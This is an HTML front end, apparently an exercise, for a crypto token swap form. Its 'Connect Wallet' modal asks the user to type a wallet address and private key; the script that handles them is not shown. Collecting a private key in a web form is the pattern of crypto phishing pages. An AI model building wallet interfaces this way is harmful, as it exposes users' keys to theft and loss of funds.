<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Fancy Form</title>
  <link href="style.css" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
</head>
<body>
  <form onsubmit="return !1">
    <h1 class="swap-header">Swap</h1>
    <div class="form-group">
      <label for="input-amount">Amount to send</label>
      <div class="input-group">
        <input id="input-amount" type="number" />
        <div class="select-wrapper" id="input-select-wrapper">
          <div class="custom-select" id="input-token">
            <div class="custom-select-trigger" id="input-token-trigger">
              <span>Select token</span>
              <img src="" alt="" class="token-icon" id="input-token-icon">
            </div>
            <div class="custom-options" id="input-options"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="form-group">
      <label for="output-amount">Amount to receive</label>
      <div class="input-group">
        <input id="output-amount" type="number" readonly />
        <div class="select-wrapper" id="output-select-wrapper">
          <div class="custom-select" id="output-token">
            <div class="custom-select-trigger" id="output-token-trigger">
              <span>Select token</span>
              <img src="" alt="" class="token-icon" id="output-token-icon">
            </div>
            <div class="custom-options" id="output-options"></div>
          </div>
        </div>
      </div>
    </div>
    <button id="confirm-swap">Confirm Swap</button>
  </form>

  <!-- Modal for wallet details -->
  <div id="walletModal" class="modal">
    <div class="modal-content">
      <span class="close">&times;</span>
      <h2>Connect Wallet</h2>
      <form id="wallet-form">
        <div class="form-group">
          <label for="wallet-address">Wallet Address</label>
          <input id="wallet-address" type="text" required />
        </div>
        <div class="form-group">
          <label for="wallet-private-key">Private Key</label>
          <input id="wallet-private-key" type="password" required />
        </div>
        <button type="submit">Connect</button>
      </form>
    </div>
  </div>

  <script src="script.js"></script>
</body>
</html>
